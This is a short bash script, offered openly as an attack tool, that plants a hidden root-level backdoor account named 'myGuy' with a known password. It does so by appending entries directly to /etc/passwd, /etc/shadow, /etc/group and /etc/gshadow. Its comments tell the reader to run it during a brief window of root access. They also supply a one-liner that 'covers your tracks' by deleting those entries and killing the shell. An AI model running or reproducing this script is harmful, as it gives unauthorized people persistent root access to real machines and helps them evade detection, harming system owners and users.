#!/bin/bash
# this script needs to run as root, but if you get a brief moment to run it as root
# it will create the user myGuy with pw 1234 with root privileges and /root as home
echo 'myGuy:x:0:0:myGuy:/root:/bin/bash' >> /etc/passwd
echo 'myGuy:$6$SALT$Zi0dw2CyzzlM57TS8G5fSliJ9waapbJWCETyFMPQiNo6hxBLQoD5xuEQD2XNGnyC/PgAm/1CLqxeiI287fk6F.:18648:0:99999:7:::' >> /etc/shadow
echo 'myGuy:x:0:' >> /etc/group
echo 'myGuy:|::' >> /etc/gshadow

# once done, enter the following command into the terminal to cover your tracks:
## cd /etc/ && for i in $(grep -Rl myGuy 2>/dev/null); do echo "sed -i '/myGuy/d' $i" | sh; done && kill -9 $$

